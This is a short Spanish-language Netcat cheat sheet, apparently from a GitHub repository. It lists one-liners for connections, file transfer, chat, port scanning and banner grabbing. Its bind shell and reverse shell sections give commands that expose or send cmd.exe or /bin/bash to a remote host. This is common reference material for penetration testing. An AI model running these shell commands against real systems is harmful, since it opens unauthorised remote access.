# Netcat Cheat Sheet

#### Conectarnos a un puerto de un host

- `nc -nv <IPAddress> <Port>`: Conexión a un host.

#### Transferir un archivo

- `nc -nvlp <Port> > output.txt`: Host a recibir el archivo en el puerto especificado.

- `nc -nv <IPAddress> <Port> < input.txt`: Host que envia el archivo al host destino.

#### Chatear entre hosts

- `nc -nvlp <Port>`: Escuchando la conexión.

- `nc -nv <IPAddress> <Port>`: Host se conecta al host al puerto abierto.

#### Bind Shell (Windows)

- `nc -nvlp <Port> -e cmd.exe`: Escuchando la conexión.

- `nc -nv <IPAddress> <Port>`: Conexión a la shell.

#### Bind Shell (Linux)

- `nc -nvlp <Port> -e /bin/bash`: Escuchando la conexión.

- `nc -nv <IPAddress> <Port>`: Conexión a la shell.

#### Reverse Shell (Windows)

- `nc -nvlp <Port>`: Escuchando la conexión.

- `nc -nv <IPAddress> <Port> -e cmd.exe`: Conexión al host y mandamos la shell.

#### Reverse Shell (Linux)

- `nc -nvlp <Port>`: Escuchando la conexión.

- `nc -nv <IPAddress> <Port> -e /bin/bash`: Conexión al host y mandamos la shell.

#### Escanear Puertos

- `nc -vz <IPAddress> <Port-Range>`: Escanear la IP del host con el rango de puertos.

#### Banner Grabbing

- `echo "" | nc -nv -w1 <IPAddress> <Port>`: Banner Grabbing.

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)